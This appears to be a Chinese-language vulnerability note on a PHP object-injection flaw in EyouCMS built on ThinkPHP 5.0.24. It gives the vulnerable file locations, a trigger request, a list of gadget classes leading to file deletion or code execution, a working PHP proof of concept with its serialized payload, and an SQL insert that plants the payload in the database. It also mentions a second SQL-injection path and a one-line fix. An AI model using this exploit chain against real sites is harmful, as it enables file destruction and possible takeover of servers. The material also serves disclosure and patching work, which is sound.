漏洞点 1（反序列化 sink）：application/api/controller/Ajax.php 第 483 行附近
    $attarray = unserialize(stripslashes($arcmultiRow['attstr']));
    // 无 allowed_classes 限制，也未用应用自带的 safe_unserialize()
漏洞点 2（写入点）：core/library/think/template/taglib/eyou/TagArclist.php 第 747/758 行
    $attstr = addslashes(serialize($tag));
    ... 'attstr' => $attstr,   // 存入 ey_arcmulti 表
框架版本：core/base.php 第 12 行  define('THINK_VERSION', '5.0.24');
→ 可直接套 phpggc 的 ThinkPHP 5.0.x gadget 链

触发请求：
    POST /example.com?m=api&c=Ajax&a=arcpagelist
    X-Requested-With: XMLHttpRequest
    tagid=<tagid>&tagidmd5=<ey_arcmulti.tagid>&page=2&pagesize=10

可用 gadget（PHP 对象注入 → RCE / 文件操作）：
    think\process\pipes\Windows   __destruct()  → 任意文件删除
    think\model\Pivot             __destruct()  → SQL 注入 / RCE
    think\Process                 __destruct()  → 进程控制
    think\Db\Connection           __destruct()  → 数据库操作

POC（文件删除链，PoC 原文）：
<?php
namespace think\process\pipes;
class Windows {
    private $files = [];
    public function __construct() { $this->files = ['/var/www/html/target_file.php']; }
}
echo serialize(new Windows());
// O:27:"think\process\pipes\Windows":1:{s:34:"think\process\pipes\Windowsfiles";a:1:{i:0;s:28:"/var/www/html/target_file.php";}}

写入 ey_arcmulti：
INSERT INTO ey_arcmulti (tagid, tagname, attstr, pagesize, querysql, add_time, update_time)
VALUES ('tagid_x','arclist','<序列化串>',10,'SELECT * FROM ey_archives LIMIT 10',UNIX_TIMESTAMP(),UNIX_TIMESTAMP());

同文件还有二次 SQL 注入面：Db::query($querysql)（第 493 行）直接执行库里的 querysql

修复建议（官方 v1.7.8 已修）：改用 safe_unserialize() / allowed_classes=false / 改 JSON
